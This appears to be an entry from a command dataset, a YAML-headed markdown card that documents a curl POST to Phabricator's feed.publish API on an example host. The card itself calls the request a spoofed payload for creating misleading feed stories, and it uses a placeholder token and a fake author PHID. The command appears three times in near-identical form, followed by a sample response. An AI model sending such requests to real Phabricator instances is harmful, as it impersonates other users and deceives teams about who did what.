---
id: cmd-uuid-4
data: >-
  curl -X POST 'https://phabricator.example.com/api/feed.publish' -H
  'Content-Type: application/x-www-form-urlencoded' -d
  'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"PHID-USER-spoofed","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"PHID-PROJ-restricted"}'
tags:
  - api-submit
  - phabricator
  - spoofing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:11.049Z'
verified: false
validated: true
submitted: true
---
# curl-submit-phabricator-feed

## Command

```bash
curl -X POST 'https://phabricator.example.com/api/feed.publish' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"PHID-USER-spoofed","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"PHID-PROJ-restricted"}'
```

## Description

Submits a spoofed payload to Phabricator's feed.publish API to create misleading stories.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H 'Content-Type: ...'` | Form encoding | Yes |
| `-d '...'` | API params with spoofed data | Yes |
| `data` | JSON payload with PHIDs | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://phabricator.example.com/api/feed.publish' -H 'Content-Type: application/x-www-form-urlencoded' -d 'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"PHID-USER-spoofed","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"PHID-PROJ-restricted"}'
```

### Advanced Usage

```bash
curl -X POST 'https://phabricator.example.com/api/feed.publish' -H 'Content-Type: application/x-www-form-urlencoded' -d 'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"PHID-USER-spoofed","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"PHID-PROJ-restricted","extra":"invalid"}'
```

## Expected Output

{"result":{"story":{"id":"456"}}}

## Related

- [[Related Procedure]]
